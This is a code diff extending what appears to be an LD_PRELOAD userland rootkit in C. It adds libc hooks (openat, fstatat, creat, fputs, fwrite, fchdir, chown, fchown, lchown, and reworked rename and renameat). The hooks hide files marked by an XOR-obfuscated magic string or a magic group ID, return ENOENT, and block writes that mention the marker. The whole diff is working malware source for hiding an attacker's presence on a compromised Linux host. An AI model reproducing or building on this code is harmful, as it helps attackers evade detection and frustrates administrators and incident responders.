@@ -35,14 +35,14 @@
 
 //misc
 int (*old_execve)(const char *path, char *const argv[], char *const envp[]); 
-int (*old_chmod)(const char *pathname, mode_t mode); 
 char *(*old_fgets)(char *s, int size, FILE *stream);
 long int (*old_ptrace)(enum __ptrace_request request, ...);
 
 //directory functions
 struct dirent *(*old_readdir)(DIR *dirp);
 struct dirent64 *(*old_readdir64)(DIR *dirp); 
-int (*old_chdir)(const char *path); 
+int (*old_chdir)(const char *path);
+int (*old_fchdir)(int fildes); 
 int (*old_mkdir)(const char *pathname, mode_t mode); 
 int (*old_mkdirat)(int dirfd, const char *pathname, mode_t mode);
 int (*old_rmdir)(const char *pathname); 
@@ -58,8 +58,14 @@ int (*old_symlink)(const char *path1, const char *path2);
 //file opening functions 
 int (*old_access)(const char *path, int amode); 
 int (*old_open)(const char *file, int oflag, ...);
+int (*old_openat)(int fd, const char *path, int oflag, ...);
 int (*old_faccessat)(int fd, const char *path, int amode, int flag); 
 FILE *(*old_fopen)(const char *pathname, const char *mode); 
+
+//write
+int (*old_creat)(const char *path, mode_t mode);
+int (*old_fputs)(const char *s, FILE *stream);
+size_t (*old_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);
 
 //file naming functions 
 int (*old_rename)(const char *oldpath, const char *newpath);
@@ -72,6 +78,12 @@ int (*old___xstat)(int ver, const char *path, struct stat *buf);
 int (*old_fstat)(int fildes, struct stat *buf); 
 int (*old_fstatat)(int fd, const char *restrict path, struct stat *restrict buf, int flag); 
 int (*old_lstat)(const char *restrict path, struct stat *restrict buf);
+
+//permissions 
+int (*old_chmod)(const char *pathname, mode_t mode); 
+int (*old_chown)(const char *pathname, uid_t owner, gid_t group); 
+int (*old_fchown)(int fd, uid_t owner, gid_t group); 
+int (*old_lchown)(const char *pathname, uid_t owner, gid_t group); 
 
 void xor(char *s)
 {
@@ -219,6 +231,7 @@ int lstat(const char *pathname, struct stat *buf)
 	}
 	return old_lstat(pathname, buf); 
 }
+
 int fstat(int fildes, struct stat *buf) 
 { 
 	HOOK(fstat); 
@@ -226,7 +239,6 @@ int fstat(int fildes, struct stat *buf)
 	printf("[!] fstat hooked\n"); 
 	#endif
 	struct stat filestat; 
-	char *magic = strdup(MAGIC); xor(magic); 
 	if (owned()) return old_fstat(fildes, buf); 
 	old_fstat(fildes, &filestat);	
 	if (filestat.st_gid == MAGICGID)
@@ -235,6 +247,23 @@ int fstat(int fildes, struct stat *buf)
 		return -1; 
 	}
 	return old_fstat(fildes, buf);
+}
+
+int fstatat(int fd, const char *restrict path, struct stat *restrict buf, int flag)
+{
+	HOOK(fstatat); 
+	#ifdef DEBUG
+	printf("[!] fstatat hooked\n"); 
+	#endif 
+	struct stat filestat; 
+	if (owned()) return old_fstatat(fd, path, buf, flag); 
+	old_fstatat(fd, path, &filestat, flag); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		errno = ENOENT; 
+		return -1; 
+	} 
+	return old_fstatat(fd, path, buf, flag);
 }
 
 int link(const char *oldpath, const char *newpath)
@@ -317,44 +346,103 @@ int symlink(const char *path1, const char *path2)
 	CLEAN(magic);	
 	return old_symlink(path1, path2); 
 }
+
+int creat(const char *path, mode_t mode)
+{ 
+	HOOK(creat);
+	#ifdef DEBUG 
+	printf("[!] creat hooked"); 
+	#endif 
+
+	if (owned()) return old_creat(path, mode); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	if (strstr(path, magic))
+	{ 
+		CLEAN(magic);
+		errno = ENOENT; 
+		return -1; 
+	} 
+	CLEAN(magic); 
+	return old_creat(path, mode); 
+} 
+
+int fputs(const char *s, FILE *stream)
+{ 
+	HOOK(fputs); 
+	#ifdef DEBUG 
+	printf("[!] fputs hooked\n"); 
+	#endif 
+
+	if (owned()) return old_fputs(s, stream); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	if (strstr(s, magic))
+	{ 
+		CLEAN(magic); 
+		errno = ENOENT; 
+		return -1; 
+	} 
+	CLEAN(magic); 
+	return old_fputs(s, stream); 
+} 
+
+size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
+{ 
+	HOOK(fwrite); 
+	#ifdef DEBUG 
+	printf("[!] fwrite hooked\n"); 
+	#endif 
+
+	if (owned()) return old_fwrite(ptr, size, nmemb, stream); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	if (strstr(ptr, magic))
+	{ 
+		CLEAN(magic); 
+		return 0; 
+	} 
+	CLEAN(magic); 
+	return old_fwrite(ptr, size, nmemb, stream);
+}
+
 int rename(const char *oldpath, const char *newpath)
 {
 	HOOK(rename);
+	HOOK(__xstat);
 	#ifdef DEBUG
-	printf("[!] rename hooked");
+	printf("[!] rename hooked\n");
 	#endif
-	if (owned())
-	{
-		char *magic = strdup(MAGIC); xor(magic);
-		if (strstr(oldpath, magic))
-		{
-			errno = ENOENT; 
-			return -1; 
-		}
-		CLEAN(magic);
-		return old_rename(oldpath, newpath);
-	}
-	return old_rename(oldpath, newpath);
+	
+	if (owned()) return old_rename(oldpath, newpath); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___xstat(_STAT_VER, oldpath, &filestat);
+	if (strstr(oldpath, magic) || strstr(newpath, magic) || filestat.st_gid == MAGICGID)
+	{ 
+		errno = ENOENT; 
+		return -1; 
+	} 
+	CLEAN(magic); 
+	return old_rename(oldpath, newpath); 
 }
 
 int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath)
 { 
 	HOOK(renameat); 
+	HOOK(__xstat);
 	#ifdef DEBUG
-	printf("[!] renameat hooked"); 
+	printf("[!] renameat hooked\n"); 
 	#endif
-	if (owned())
+	
+	if (owned()) return old_renameat(olddirfd, oldpath, newdirfd, newpath); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___xstat(_STAT_VER, oldpath, &filestat); 
+	if (strstr(oldpath,  magic) || strstr(newpath, magic) || filestat.st_gid == MAGICGID)
 	{ 
-		char *magic = strdup(MAGIC); xor(magic);
-		if (strstr(oldpath, magic))
-		{
-			errno = ENOENT; 
-			return -1; 
-		}
-		CLEAN(magic);
-		return old_renameat(olddirfd, oldpath, newdirfd, newpath);
+		errno = ENOENT; 
+		return -1; 
 	}
-	return old_renameat(olddirfd, oldpath, newdirfd, newpath);
+	CLEAN(magic); 
+	return old_renameat(olddirfd, oldpath, newdirfd, newpath); 
 }
 
 
@@ -402,7 +490,7 @@ int chdir(const char *path)
 { 
 	HOOK(chdir);
 	#ifdef DEBUG
-	printf("[!] chdir hooked"); 
+	printf("[!] chdir hooked\n"); 
 	#endif
 
 	char *magic = strdup(MAGIC); xor(magic);
@@ -417,6 +505,28 @@ int chdir(const char *path)
 	}
 	return old_chdir(path);
 } 
+
+int fchdir(int fildes)
+{ 
+	HOOK(fchdir); 
+	HOOK(fstat); 
+	#ifdef DEBUG 
+	printf("[!] fchdir hooked\n"); 
+	#endif
+
+	if (owned()) return old_fchdir(fildes); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old_fstat(fildes, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		CLEAN(magic);
+		errno = ENOENT; 
+		return -1; 
+	}
+	CLEAN(magic); 
+	return old_fchdir(fildes);
+}
 
 int mkdir(const char *pathname, mode_t mode)
 { 
@@ -518,7 +628,29 @@ int open(const char *file, int oflag, ...)
 		errno = ENOENT; 
 		return -1; 
 	}
+	CLEAN(magic);
 	return old_open(file, oflag);
+}
+
+int openat(int fd, const char *path, int oflag, ...)
+{ 
+	HOOK(openat); 
+	HOOK(__xstat); 
+	#ifdef DEBUG 
+	printf("[!] openat hooked\n"); 
+	#endif 
+
+	if (owned()) return old_openat(fd, path, oflag); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___xstat(_STAT_VER, path, &filestat); 
+	if ((strstr(path, magic)) || filestat.st_gid == MAGICGID)
+	{
+		errno = ENOENT; 
+		return -1; 
+	}
+	CLEAN(magic);
+	return old_openat(fd, path, oflag);
 }
 
 int access(const char *pathname, int mode)
@@ -535,17 +667,17 @@ int access(const char *pathname, int mode)
 	old___xstat(_STAT_VER, pathname, &filestat); 
 	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
 	{ 
-		CLEAN(magic);
 		errno = ENOENT; 
 		return -1; 
 	}
+	CLEAN(magic);
 	return old_access(pathname, mode);
 }
 FILE *fopen(const char *pathname, const char *mode)
 { 
 	HOOK(fopen); 
 	#ifdef DEBUG 
-	printf("[!] fopen hooked"); 
+	printf("[!] fopen hooked\n"); 
 	#endif 
 
 	if (owned()) return old_fopen(pathname, mode);
@@ -578,9 +710,9 @@ char *fgets(char *s, int size, FILE *stream)
 		char *magic = strdup(MAGIC); xor(magic);
 		if (filestat.st_gid == MAGICGID)
 		{ 
-			return NULL; // s is owned by magic; return null
-			CLEAN(magic);
+			CLEAN(magic); 
 			CLEAN(p);
+			return NULL; // s is owned by magic; return null
 		}
 		else
 		{
@@ -610,6 +742,63 @@ int chmod(const char *path, mode_t mode)
 		return -1;
 	}
 	return old_chmod(path, mode);
+}
+
+int chown(const char *pathname, uid_t owner, gid_t group)
+{ 
+	HOOK(chown); 
+	#ifdef DEBUG 
+	printf("[!] chown hooked\n"); 
+	#endif 
+
+	if (owned()) return old_chown(pathname, owner, group); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	if (strstr(pathname, magic))
+	{ 
+		errno = ENOENT; 
+		return -1; 
+	}
+	return old_chown(pathname, owner, group);
+}	
+
+int fchown(int fd, uid_t owner, gid_t group)
+{ 
+	HOOK(fchown); 
+	HOOK(fstat); 
+	#ifdef DEBUG 
+	printf("[!] fchown hooked\n"); 
+	#endif 
+
+	if (owned()) return old_fchown(fd, owner, group); 
+	char *magic = strdup(MAGIC); xor(magic);
+	struct stat filestat; 
+	old_fstat(fd, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		errno = ENOENT; 
+		return -1; 
+	}
+	return old_fchown(fd, owner, group); 
+}
+
+int lchown(const char *pathname, uid_t owner, gid_t group)
+{ 
+	HOOK(lchown); 
+	HOOK(__xstat); 
+	#ifdef DEBUG 
+	printf("[!] lchown hooked\n"); 
+	#endif 
+
+	if (owned()) return old_lchown(pathname, owner, group); 
+	char *magic = strdup(MAGIC); xor(magic); 
+	struct stat filestat; 
+	old___xstat(_STAT_VER, pathname, &filestat); 
+	if ((strstr(pathname, magic)) || filestat.st_gid == MAGICGID)
+	{ 
+		 errno = ENOENT; 
+		 return -1; 
+	} 
+	return old_lchown(pathname, owner, group); 
 }
 
 
